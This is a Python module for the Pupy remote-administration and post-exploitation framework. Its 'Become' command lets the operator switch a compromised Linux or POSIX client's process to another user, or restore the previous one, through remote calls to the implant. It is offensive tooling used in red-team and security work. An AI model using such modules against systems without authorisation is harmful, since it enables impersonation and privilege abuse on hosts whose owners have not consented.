# -*- coding: utf-8 -*-

from __future__ import absolute_import
from __future__ import division
from __future__ import print_function
from __future__ import unicode_literals
from pupy.pupylib.PupyModule import config, PupyModule, PupyArgumentParser

__class_name__="Become"

@config(compat=['linux', 'posix'], cat="admin")
class Become(PupyModule):
    """ Become user """

    dependencies = ['become']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='users', description=cls.__doc__)
        action = cls.arg_parser.add_mutually_exclusive_group(required=True)
        action.add_argument('-u', '--user', help='Become user')
        action.add_argument('-r', '--restore', action='store_true', help='Restore previous user')

    def run(self, args):
        become = self.client.remote('become', 'become', False)
        restore = self.client.remote('become', 'restore', False)

        try:
            if args.restore:
                restore()
                self.success('Context restored')
            else:
                become(args.user)
                self.success('You became {}'.format(args.user))

        except Exception as e:
            self.error(str(e))
